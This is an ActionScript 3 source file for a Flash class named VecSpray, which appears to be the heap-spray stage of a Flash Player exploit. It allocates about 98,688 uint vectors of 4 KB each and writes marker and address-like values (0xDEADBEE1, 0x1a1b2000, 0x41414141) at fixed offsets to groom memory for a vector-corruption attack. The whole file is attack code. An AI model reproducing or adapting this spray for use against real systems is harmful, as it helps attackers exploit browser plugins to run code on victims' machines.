//class VecSpray - GH4
package 
{
   import flash.media.*;
   import flash.display.Sprite;
    
    public class VecSpray extends Sprite
    {
	public var s:__AS3__.vec.Vector.<Object>;
		
        public function VecSpray()
        {
            super();
            this.s = new Vector.<Object>(98688);
	        var loc1:*=0;
            
            while (loc1 < 98688)
            {
                this.s[loc1] = new Vector.<uint>(4096 / 4 - 2);//0x3FE
                this.s[loc1][0]              = 0xDEADBEE1;
                this.s[loc1][(16 - 8) / 4]   = 0x1a1b2000;  //[2]
                this.s[loc1][(20 - 8) / 4]   = 0x1a1b2000; //[3]
                this.s[loc1][(752 - 8) / 4]  = 0x41414141;  //[186]
		this.s[loc1][(448 - 8) / 4]  = 0;          //[110]
                ++loc1;
            }                       
            return;
        }        
    }
}


